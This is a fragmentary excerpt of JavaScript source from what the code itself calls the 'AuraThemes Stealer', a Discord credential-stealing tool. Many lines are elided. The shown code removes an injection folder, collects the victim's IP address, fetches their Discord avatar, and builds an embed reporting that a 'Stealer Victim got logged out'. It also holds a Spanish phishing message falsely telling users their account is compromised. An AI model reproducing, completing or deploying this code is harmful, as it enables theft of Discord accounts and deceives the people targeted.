...
const FirstTime = async () => {
  ...
  if (fs.existsSync(__dirname + "/AuraThemesInject")) {
    try {
      fs.rmdirSync(__dirname + "/AuraThemesInject");
    } catch (err) {}
    var ip = await getIP();
    console.log(ip);
    ...
    if (!token) {
      ...
      userAvatar = userAvatar ?? (
        await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
      );
    ...
    if (
      ...
      if (!token) {
        ...
        var params = await makeEmbed({
          title: "AuraThemes Stealer Victim got logged out",
...
async function traduireTexte(langueCible) {
  var languages = {
    ...
    "es-ES": [
      ...
      "Hemos detectado algo inusual en tu cuenta de Discord, tu dirección",
      "ha sido comprometida.",
      "Por favor, cámbiala para seguir utilizando tu cuenta.",
